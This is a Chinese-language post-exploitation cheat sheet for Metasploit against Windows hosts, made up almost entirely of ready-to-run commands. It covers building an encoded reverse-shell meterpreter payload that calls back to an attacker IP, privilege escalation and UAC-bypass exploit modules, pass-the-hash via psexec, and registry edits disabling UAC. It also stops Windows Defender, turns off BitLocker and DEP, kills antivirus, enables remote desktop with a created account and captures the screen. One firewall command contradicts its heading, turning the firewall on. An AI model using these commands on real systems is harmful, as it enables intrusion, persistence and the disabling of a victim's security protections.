
# 后渗透测试阶段

* 原理
* 基于已有session扩大战果
* 获取system账号权限
* 绕过UAC限制
* 利用漏洞直接提权为 system
* 图形化payload
* Psexec 模块之 Passthehash
* 关闭 windows 防火墙
* 关闭 Windefend
* Bitlocker 磁盘加密
* 关闭 DEP
* 杀死防病毒软件
* 开启远程桌面服务
* 查看远程桌面

## 原理
> * 已经获得目标系统控制权后扩大战果
>   - 提权
>   - 信息收集
>   - 渗透内网
>   - 永久后门

## 基于已有session扩大战果
``` 
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp    LHOST=1.1.1.1 LPORT=4444 -b "\x00" -e x86/shikata_ga_nai -f exe -o   1.exe
```

## 获取system账号权限
``` 
load priv
getsystem
    priv_elevate_getsystem: Operation failed: Access is denied.
```

## 绕过UAC限制
``` 
use exploit/windows/local/ask
    set session
    set filename
use exploit/windows/local/bypassuac
use exploit/windows/local/bypassuac_injection
    set session
    set payload
```

## 利用漏洞直接提权为 system
``` 
use exploit/windows/local/ms13_053_schlamperei
use exploit/windows/local/ms13_081_track_popup_menu
use exploit/windows/local/ms13_097_ie_registry_symlink
use exploit/windows/local/ppr_flatten_rec
```



## 图形化payload
``` 
set payload windows/vncinject/reverse_tcp
set viewonly no
```

## Psexec 模块之 Passthehash
``` 
use exploit/windows/smb/psexec
set smbpass hash
// 需要提前关闭 UAC
cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t        REG_DWORD /d 1 /f
cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t        REG_DWORD /d 1 /f
```

## 关闭 windows 防火墙
``` 
netsh advfirewall set allprofiles state on
```

## 关闭 Windefend
``` 
net stop windefend
```

## Bitlocker 磁盘加密
``` 
manage-bde -off C:
manage-bde -status C:
```


## 关闭 DEP
``` 
bcdedit.exe /set {current} nx AlwaysOff
```

## 杀死防病毒软件
``` 
Run killav
run post/windows/manage/killav
```

## 开启远程桌面服务
``` 
run post/windows/manage/enable_rdp
run getgui –e
    run getgui -u yuanfh -p pass
    run multi_console_command -rc /root/.msf4/logs/scripts/getgui/clean_up__20160824.1855.rc
```

## 查看远程桌面
``` 
screenshot
use espia
    screengrab
```
